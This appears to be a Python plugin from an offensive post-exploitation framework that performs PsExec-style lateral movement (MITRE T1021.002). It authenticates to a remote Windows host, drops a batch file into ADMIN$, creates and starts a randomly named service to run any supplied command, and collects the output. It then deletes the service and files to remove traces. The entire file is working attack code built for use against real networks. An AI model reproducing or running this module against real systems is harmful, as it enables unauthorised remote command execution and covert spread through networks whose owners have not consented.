"""lateral_movement/psexec — SMB service-based remote execution (PsExec-style, no binary needed). MITRE T1021.002"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class PsExec(BasePlugin):
    NAME        = "psexec"
    DESCRIPTION = "Copy bat to ADMIN$, create+start service, capture output, cleanup. No psexec.exe needed."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1021.002"
    CATEGORY    = "lateral_movement"
    schema      = ParamSchema().add(
        Param("target",   str, required=True,  help="Target hostname or IP"),
        Param("cmd",      str, required=True,  help="Command to execute on remote host"),
        Param("username", str, required=False, default="", help="Username for authentication"),
        Param("password", str, required=False, default="", help="Password"),
        Param("svc_name", str, required=False, default="", help="Service name (random if omitted)"),
        Param("wait_sec", int, required=False, default=8,  help="Seconds to wait for command output"),
    )

    @mitre("T1021.002")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        target   = params["target"]
        cmd      = params["cmd"].replace("'", "''")
        user     = params.get("username", "")
        pwd      = params.get("password", "")
        svc_name = params.get("svc_name", "").strip()
        wait     = params.get("wait_sec", 8)

        auth_block = (
            f"net use \\\\'{target}'\\IPC$ /user:'{user}' '{pwd}' 2>&1 | Out-Null;"
            if user else ""
        )
        cleanup_auth = (
            f"net use \\\\'{target}'\\IPC$ /delete 2>&1 | Out-Null;"
            if user else ""
        )

        ps = (
            f"$tgt = '{target}';"
            f"$svc = if ('{svc_name}') {{ '{svc_name}' }} else {{ 'svc' + (Get-Random -Max 99999) }};"
            "$results = @();"
            + auth_block
            # Write bat to local TEMP then copy to remote ADMIN$\Temp
            + "$outName = \"$svc.out\";"
            "$batName = \"$svc.bat\";"
            "$batLocal = \"$env:TEMP\\$batName\";"
            "$uncBase  = \"\\\\$tgt\\ADMIN$\\Temp\";"
            "$uncBat   = \"$uncBase\\$batName\";"
            "$uncOut   = \"$uncBase\\$outName\";"
            "$remoteOut = \"C:\\Windows\\Temp\\$outName\";"
            "$remoteBat = \"C:\\Windows\\Temp\\$batName\";"

            # Create the bat
            f"\"@echo off`r`n{cmd} > C:\\Windows\\Temp\\$outName 2>&1\" | Set-Content $batLocal -Encoding ASCII;"
            "try { Copy-Item $batLocal $uncBat -Force -EA Stop } catch { $results += \"[-] Copy to ADMIN$ failed: $_\"; return };"

            # Create service
            "$scCreate = sc.exe \\\\$tgt create $svc binPath= \"cmd.exe /c $remoteBat\" type= own start= demand 2>&1;"
            "$results += \"Create: $scCreate\";"

            # Start service
            "$scStart = sc.exe \\\\$tgt start $svc 2>&1;"
            "$results += \"Start: $scStart\";"

            f"Start-Sleep -Seconds {wait};"

            # Read output
            "if (Test-Path $uncOut) {"
            "  $results += '[Output]';"
            "  $results += Get-Content $uncOut -EA SilentlyContinue"
            "} else {"
            "  $results += '[-] Output file not yet available';"
            "};"

            # Cleanup
            "sc.exe \\\\$tgt stop $svc 2>&1 | Out-Null;"
            "sc.exe \\\\$tgt delete $svc 2>&1 | Out-Null;"
            "Remove-Item $uncBat -Force -EA SilentlyContinue;"
            "Remove-Item $uncOut -Force -EA SilentlyContinue;"
            "Remove-Item $batLocal -Force -EA SilentlyContinue;"
            + cleanup_auth
            + "$results -join \"`n\""
        )
        r = ctx.ps(ps)
        if r["status"] != "ok":
            return ModuleResult.err(r["output"])
        return ModuleResult.ok(data=r["output"])
